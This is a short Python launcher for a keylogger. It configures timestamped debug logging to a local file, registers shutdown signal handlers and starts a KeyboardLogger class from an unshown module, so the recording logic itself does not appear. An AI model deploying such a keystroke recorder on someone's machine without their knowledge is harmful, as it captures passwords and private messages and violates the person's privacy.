import keyboard_logger
import os
import datetime
import logging
import sys
import signal


def get_log_file_path():
  current_dir = os.path.dirname(os.path.abspath(__file__))
  
  timestamp = datetime.datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
  
  return os.path.join(current_dir, f"log_{timestamp}.txt")

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s %(message)s',
    datefmt='%d-%m-%Y %H-%M-%S',
    filemode='w',
    filename=get_log_file_path()
)

logger = logging.getLogger(__name__)

def graceful_shutdown(signum, frame):
  logger.info('shutting down')
  logging.shutdown()
  sys.exit(0)

signal.signal(signal.SIGINT, graceful_shutdown)
signal.signal(signal.SIGTERM, graceful_shutdown)


if __name__ == "__main__":
  keylogger = keyboard_logger.KeyboardLogger(logger=logger)
  keylogger.run()
